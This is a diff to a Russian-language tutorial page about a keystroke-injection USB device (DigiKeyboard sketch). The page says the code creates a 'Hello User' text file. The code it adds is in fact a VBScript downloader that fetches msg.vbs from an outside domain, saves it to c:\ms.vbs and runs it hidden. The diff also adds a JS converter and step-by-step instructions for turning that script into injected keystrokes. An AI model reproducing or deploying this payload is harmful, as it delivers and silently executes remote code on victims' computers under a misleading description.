@@ -57,10 +57,19 @@
 <p>Для создания на локальном диске текстового документа с текстом Hello User нам понадобиться код конвертор на js:</p>
 
 <pre>
-jjjjj</pre>
-
-<p>&nbsp;</p>
-
-<p>&nbsp;</p>
-
-<p>&nbsp;</p>
+var str = 'dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")|dim bStrm: Set bStrm = createobject("Adodb.Stream")|xHttp.Open "GET", "https://xn--80aqah2a0c.com/msg.vbs", False|xHttp.Send|with bStrm|.type = 1|.open|.write xHttp.responseBody|.savetofile "c:\ms.vbs", 2|end with|Set WshShell = CreateObject("WScript.Shell")|WshShell.Run "c:\ms.vbs", 0, false|Set WshShell = Nothing|WScript.Quit';
+var total = '';
+for(var i =0;i<str.length;i++){
+total+="st('"+str[i]+"');"+'<br>';
+}
+document.write(total);
+</pre>
+Использование конвертора:
+Нажимаем в браузере в новой вкладке: Сtrl+Shift+R;
+Переходим во кладку "Console";
+Копируем код выше в консоль;
+Меняем значение переменной str на своё;
+Нажимаем Enter;
+Получившийся код вставляем в скетч с заменой с 1008 по 1011 строку.
+По вкусу в нужных местах используем Enter строчкой вида:
+<pre>DigiKeyboard.sendKeyStroke(KEY_ENTER);</pre>
